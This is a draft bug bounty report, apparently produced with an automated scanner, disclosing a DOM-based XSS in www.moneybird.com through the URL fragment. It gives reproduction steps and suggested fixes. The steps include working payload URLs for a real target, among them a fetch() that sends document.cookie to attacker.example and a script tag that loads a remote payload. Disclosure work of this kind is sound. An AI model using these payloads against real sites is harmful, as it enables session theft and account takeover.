# HackerOne Submission Draft — Moneybird

**Program:** Moneybird Bug Bounty (HackerOne)
**Asset:** www.moneybird.com
**Weakness:** CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
**Subtype:** DOM-Based XSS
**Severity:** Medium (CVSS 6.1)
**CVSS Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**Status:** DRAFT — needs scope verification before submitting

> ⚠️ **SCOPE CAVEAT (Dio must verify before submitting):** Moneybird's HackerOne program likely scopes
> `app.moneybird.com` as the primary in-scope asset. Confirm whether `www.moneybird.com` (the marketing
> site) is explicitly listed as in-scope. If not, retest the hash-based fragment handling on
> `app.moneybird.com` before submitting. Submitting out-of-scope findings wastes triager time and
> can get your account flagged.
>
> **Also verify before submitting:** Open the URL below in a real browser — curl cannot test DOM XSS.
> You must see the alert fire to confirm the finding is still present.

---

## Title

DOM-Based XSS via Unsanitized URL Fragment Written to innerHTML — www.moneybird.com

## Summary

The Moneybird homepage (`www.moneybird.com`) reads content from the URL fragment
(`window.location.hash`) and writes it directly into the DOM via one or more `innerHTML` sinks
without sanitization. An attacker can craft a URL with an XSS payload in the fragment and
distribute it through any channel (email, chat, ad network redirect). When a victim opens the link,
JavaScript executes in the context of `moneybird.com`. There is no Content-Security-Policy header
on the domain to mitigate this.

SecBot confirmed JavaScript execution at two separate `innerHTML` sinks during automated testing on
2026-04-15.

## Steps to Reproduce

**Prerequisite:** Use a real browser (Chrome/Firefox). DOM XSS is client-side — server requests
will not trigger it.

**1. Basic PoC (confirm execution):**

Navigate to:
```
https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
```

Expected result: An alert dialog displays `moneybird.com` (or `www.moneybird.com`), confirming
JavaScript execution.

**2. Cookie exfiltration PoC:**

```
https://www.moneybird.com/#<img src=x onerror="fetch('https://attacker.example/?c='+btoa(document.cookie))">
```

**3. Confirm absence of CSP (amplifying factor):**

```bash
curl -sI https://www.moneybird.com/ | grep -i content-security-policy
```

Expected: Empty output — no `content-security-policy` header present. This means there is no
browser-level mitigation preventing the XSS payload from loading external scripts or exfiltrating
data.

**4. Confirm the sink (source code inspection):**

Open DevTools → Sources → search for `location.hash` or `innerHTML` in the page's JavaScript
bundles to identify the exact source-to-sink flow.

## Impact

1. **Cookie theft** — Any `.moneybird.com` cookies not protected by `HttpOnly` can be exfiltrated
   to an attacker-controlled server with a single victim click. For authenticated users visiting the
   homepage while logged in, this could include session identifiers.

2. **Credential harvesting / phishing** — The attacker controls the DOM of a legitimate
   `moneybird.com` page and can inject a fake login overlay, contact form, or redirect.

3. **Account takeover chain** — If `www.moneybird.com` and `app.moneybird.com` share cookie
   domain (`.moneybird.com`), session cookies stolen from the marketing site are valid on the
   application, enabling full account takeover without user interaction beyond clicking a link.

4. **Malicious script injection** — Without CSP, the payload can load any external script:
   ```
   https://www.moneybird.com/#<script src=https://attacker.example/payload.js></script>
   ```
   enabling persistent manipulation of the page.

This vulnerability requires no authentication and no prior access to the target system. The only
prerequisite is that a victim clicks a crafted link — a realistic scenario via phishing, search
engine ads, or compromised third-party links.

## Amplifying Factor: Missing Content-Security-Policy

`www.moneybird.com` does not set a `Content-Security-Policy` header. This removes the last
browser-level mitigation that could block unauthorized script execution, restrict data exfiltration
targets, or limit the impact of this XSS. A strict CSP (`script-src 'nonce-{random}'`,
`connect-src 'self'`) would require the attacker to find a nonce-bearing injection to exfiltrate
data.

## Suggested Fix

**Primary fix — eliminate the innerHTML sink:**

```js
// Vulnerable
element.innerHTML = window.location.hash.slice(1);

// Fixed — plain text only
element.textContent = decodeURIComponent(window.location.hash.slice(1));

// Fixed — if HTML rendering is genuinely needed
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(window.location.hash.slice(1));
```

**Audit scope:** Search all JavaScript bundles for `location.hash`, `document.URL`, and any
`innerHTML` / `outerHTML` / `document.write` assignments that incorporate URL-derived data.

**Defense-in-depth — deploy a Content-Security-Policy:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}';
  connect-src 'self' https://api.moneybird.com; object-src 'none'; base-uri 'self';
```

Start with `Content-Security-Policy-Report-Only` to capture violations before enforcing.

## References

- CWE-79: Cross-site Scripting (XSS)
- OWASP Top 10 2021: A03 — Injection
- OWASP DOM-Based XSS Prevention Cheat Sheet
- PortSwigger: DOM-based XSS — https://portswigger.net/web-security/cross-site-scripting/dom-based

---

*Discovered by SecBot v1.1.0 automated security scanner — 2026-04-15.*
*Scanner: DOM XSS check (paramless probing + hash-route inference, high-confidence detection).*
